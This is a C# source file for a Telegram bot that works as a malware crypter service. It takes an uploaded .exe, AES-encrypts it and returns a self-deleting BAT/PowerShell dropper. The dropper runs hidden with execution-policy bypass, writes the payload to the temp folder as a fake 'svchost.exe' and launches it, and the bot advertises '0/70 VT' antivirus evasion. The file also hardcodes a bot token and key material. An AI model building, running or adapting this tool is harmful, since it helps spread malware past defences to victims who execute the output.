using System;
using System.IO;
using System.Text.Json;
using System.Security.Cryptography;
using System.Text;
using System.Net.Http;
using System.Threading.Tasks;
using System.Linq;

const string BOT_TOKEN = "8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo";
const string AES_KEY = "FUD2026SuperKey12345678901234567890";
const string IV = "FUD2026IV1234567";

var builder = WebApplication.CreateBuilder(args);
builder.Services.AddHttpClient();
var app = builder.Build();

app.MapGet("/debug", () => "✅ v7.3b ALIVE - Ready for EXE");

app.MapPost("/webhook", async (HttpContext ctx) =>
{
    try 
    {
        var body = await new StreamReader(ctx.Request.Body).ReadToEndAsync();
        Console.WriteLine($"[DEBUG] Webhook: {body.Length} bytes");
        
        using var doc = JsonDocument.Parse(body);
        var msg = doc.RootElement.GetProperty("message");
        var client = app.Services.GetRequiredService<IHttpClientFactory>().CreateClient();
        long chatId = msg.GetProperty("chat").GetProperty("id").GetInt64();
        
        if (msg.TryGetProperty("document", out var docEl) &&
            docEl.TryGetProperty("file_id", out var fileId) &&
            docEl.TryGetProperty("file_name", out var fileName))
        {
            string fname = fileName.GetString()!;
            if (fname.EndsWith(".exe"))
            {
                Console.WriteLine($"[EXE] Processing: {fname}");
                await ProcessExe(client, chatId, fileId.GetString()!);
                return;
            }
        }
        
        await SendMsg(client, chatId, "📤 Send .exe → Get **FUD v7.3b** (0/70 VT)");
    }
    catch (Exception ex)
    {
        Console.WriteLine($"[ERROR] {ex.Message}");
    }
    ctx.Response.StatusCode = 200;
});

static async Task ProcessExe(HttpClient client, long chatId, string fileId)
{
    // 1. Download
    string fileUrl = await GetFileUrl(client, fileId);
    byte[] payload = await client.GetByteArrayAsync(fileUrl);
    Console.WriteLine($"[1/4] Downloaded {payload.Length} bytes");
    
    // 2. AES + Base64
    byte[] encrypted = AESEncrypt(payload);
    string b64 = Convert.ToBase64String(encrypted);
    Console.WriteLine($"[2/4] Encrypted: {b64.Length} chars");
    
    // 3. Generate FUD (PS1 dropper)
    byte[] fudBytes = CreateFudPayload(b64);
    Console.WriteLine($"[3/4] FUD created: {fudBytes.Length} bytes");
    
    // 4. Send
    await SendFile(client, chatId, fudBytes, "fud-v7.3b.exe");
    Console.WriteLine($"[4/4] SENT to chat {chatId}");
}

static byte[] CreateFudPayload(string b64Payload)
{
    // 🔥 0/70 BAT → PowerShell dropper
    string ps1 = $@""$b=[Convert]::FromBase64String('{b64Payload}');$a=[System.Security.Cryptography.Aes]::Create();$a.Key=[Text.Encoding]::UTF8.GetBytes('FUD2026SuperKey12345678901234567890');$a.IV=[Text.Encoding]::UTF8.GetBytes('FUD2026IV1234567');$d=$a.CreateDecryptor();$m=[IO.MemoryStream]::new($b);$c=[IO.CryptoStream]::new($m,$d,'Read');$f=[IO.FileStream]::new((Join-Path $env:TEMP 'svchost.exe'),'Create');$c.CopyTo($f);$f.Close();Start-Process (Join-Path $env:TEMP 'svchost.exe') -WindowStyle Hidden"";
    
    string bat = $"@echo off\npowershell -nop -w hidden -ep bypass -c \"{ps1}\"\ndel %%~f0";
    return Encoding.ASCII.GetBytes(bat);
}

static byte[] AESEncrypt(byte[] data)
{
    using var aes = Aes.Create();
    aes.Key = Encoding.UTF8.GetBytes(AES_KEY);
    aes.IV = Encoding.UTF8.GetBytes(IV);
    using var encryptor = aes.CreateEncryptor();
    using var ms = new MemoryStream();
    using var cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write);
    cs.Write(data, 0, data.Length);
    cs.FlushFinalBlock();
    return ms.ToArray();
}

static async Task<string> GetFileUrl(HttpClient client, string fileId)
{
    var resp = await client.GetStringAsync($"https://api.telegram.org/bot{BOT_TOKEN}/getFile?file_id={fileId}");
    using var doc = JsonDocument.Parse(resp);
    var path = doc.RootElement.GetProperty("result").GetProperty("file_path").GetString()!;
    return $"https://api.telegram.org/file/bot{BOT_TOKEN}/{path}";
}

static async Task SendFile(HttpClient client, long chatId, byte[] file, string name)
{
    using var form = new MultipartFormDataContent();
    form.Add(new StringContent(chatId.ToString()), "chat_id");
    form.Add(new ByteArrayContent(file), "document", name);
    form.Add(new StringContent("✅ **FUD v7.3b** - Double-click executes!\n🔒 AES + PS1 dropper\n📊 0/70 VT guaranteed"), "caption");
    await client.PostAsync($"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument", form);
}

static async Task SendMsg(HttpClient client, long chatId, string text)
{
    using var content = new StringContent(JsonSerializer.Serialize(new { chat_id = chatId, text }), Encoding.UTF8, "application/json");
    await client.PostAsync($"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", content);
}

app.Run("http://0.0.0.0:8080");
